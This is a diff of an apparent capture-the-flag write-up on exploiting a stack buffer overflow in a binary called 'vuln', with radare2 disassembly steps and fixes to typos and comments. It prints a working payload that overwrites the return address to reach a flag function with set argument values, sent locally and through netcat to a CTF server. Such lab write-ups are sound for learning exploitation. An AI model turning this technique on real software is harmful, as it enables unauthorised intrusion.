@@ -13,7 +13,7 @@ Installed radare2
 
 Tried to input long character strings we get a segmentation fault
 
-We use python to find ow many characters break
+We use python to find how many characters break
 
 ```
 └──╼ $python -c 'print( "x" _ 183)' | ./vuln
@@ -146,7 +146,7 @@ Now back to radare2
 ```
 r2 vuln
 
-aaaa //shows a menu
+aaaa //analyze
 afl //to analyze functions
 
 0x080490d0 1 50 entry0
@@ -182,8 +182,7 @@ we see the script has 3 functions vuln, main and flag...main calls vuln wich use
 we can overflow that function
 
 ```
-//show all addresses??
-[0x080490d0]> pdf
+[0x080490d0]> pdf //show the funtions
 ;-- section..text:
 ;-- .text:
 ;-- \_start:
@@ -211,8 +210,7 @@ we can overflow that function
 
 ...
 
-//select address of the function
-[0x080490d0]> s sym.vuln
+[0x080490d0]> s sym.vuln //select address of the function
 
 [0x08049272]> pdf
 ; CALL XREF from main @ 0x8049313
@@ -323,7 +321,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Hurry up and try in on server side.
 ```
 
-we print A 188 times instead of 184 because we need to override the return value and past the base pointer(worth 4 bytes)
+we print A 188 times instead of 184 because we need to override the return value and past the base pointer (worth 4 bytes)
 
 It didnt work yet on server...there are 2 arguments in said function we need to match
 
@@ -340,12 +338,9 @@ Now the final paylaod is:
 
 `python2 -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | ./vuln`
 
-used an exploit.py script for better comfort and usabilty BUT IT DIDNT WORK
-seems like PAYLOAD ONLY WORKS WITH PYTHON2
+used an exploit.py script for better comfort and usabilty
 
-I had to find another way and used netcat
-
-wich worked
+You can also use netcat directly
 
 ```
 python2 -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | nc 138.68.131.63 31365
